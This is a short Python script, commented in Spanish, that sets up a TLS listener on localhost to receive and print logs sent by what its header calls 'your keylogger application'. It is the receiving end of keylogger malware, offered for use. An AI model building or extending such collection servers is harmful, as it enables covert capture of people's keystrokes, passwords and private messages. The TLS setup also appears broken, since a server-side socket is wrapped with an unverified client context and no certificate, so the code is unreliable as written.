import socket
import ssl

# CONFIGURACIÓN - USA ESTOS MISMOS VALORES EN TU APLICACIÓN KEYLOGGER
HOST = "127.0.0.1"  # Dirección de loopback (tu propia PC)
PORT = 4443         # Puerto a utilizar (elige uno entre 1024-65535)

# Crea un socket normal
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind((HOST, PORT))
    sock.listen()
    print(f"[*] Servidor escuchando en {HOST}:{PORT}. Esperando conexión...")

    conn, addr = sock.accept()
    # Envuelve la conexión con SSL (sin verificar certificado para pruebas)
    context = ssl._create_unverified_context()
    with context.wrap_socket(conn, server_side=True) as ssock:
        print(f"[+] Conexión aceptada de: {addr}")
        data = ssock.recv(1024)  # Recibe los datos
        print(f"[+] Log recibido:\n{data.decode('utf-8')}") 